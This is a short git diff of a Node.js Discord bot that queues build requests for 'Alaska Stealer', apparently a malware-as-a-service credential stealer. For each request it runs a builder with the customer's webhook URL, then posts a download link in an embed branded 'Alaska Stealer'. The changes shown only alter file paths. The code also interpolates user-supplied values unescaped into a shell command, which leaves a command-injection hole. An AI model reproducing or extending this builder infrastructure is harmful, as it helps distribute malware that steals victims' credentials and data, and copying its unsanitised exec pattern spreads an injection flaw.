@@ -81,7 +81,7 @@ async function queueLoop() {
             try {
             await exec(`cd Client && node build.js ${element.webhook_url} ${element.name}`)
             } catch (e) {console.log(e)}
-            const gofileurl = fs.readFileSync('/root/Alaska/Blaze/link.txt');
+            const gofileurl = fs.readFileSync('/root/root/Blaze/link.txt');
             const downloadlink1 = new MessageEmbed()
                 .setColor(0xFF001A)
                 .setTitle('Alaska Stealer')
@@ -90,12 +90,12 @@ async function queueLoop() {
                 .setTimestamp()
                 .setFooter({ text: '@alaskastealer', iconURL: "" });
             element.interaction.editReply({embeds: [downloadlink1]});
-            fs.rmSync(`/root/Alaska/Blaze/Client/link.txt`)
+            fs.rmSync(`/root/root/Blaze/Client/link.txt`)
         } else {
             try {
             fs.appendFileSync("link.txt", "");
             await exec(`cd Client && node build.js ${element.webhook_url} ${element.name}`)
-            const gofileurl = fs.readFileSync('/root/Alaska/Blaze/link.txt');
+            const gofileurl = fs.readFileSync('/root/root/Blaze/link.txt');
             const downloadlink2 = new MessageEmbed()
             .setColor(0xFF001A)
             .setTitle('Alaska Stealer')
